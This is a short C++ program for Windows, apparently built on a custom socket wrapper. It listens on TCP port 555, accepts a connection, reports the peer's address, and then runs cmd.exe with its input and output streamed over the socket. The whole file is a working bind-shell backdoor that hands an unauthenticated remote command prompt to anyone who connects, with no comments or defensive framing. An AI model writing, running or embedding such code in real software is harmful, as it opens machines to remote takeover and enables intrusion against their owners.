#include "headers/socket.hxx"

using namespace std;

int main(){
    WinSocket s(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    s.Bind(555);
    s.Listen(1);
    SOCKET ns = s.Accept();
    printf("Accepted\n");
    peer_t g = s.GetPeerName(ns);
    printf("[+] Address : %s:%hu\n", g.address,g.port);
    s.CSend(ns,"Hello World",0);
    s.CExecuteAndStreamProcess(ns,"cmd.exe");
    closesocket(ns);
    return 0;
}
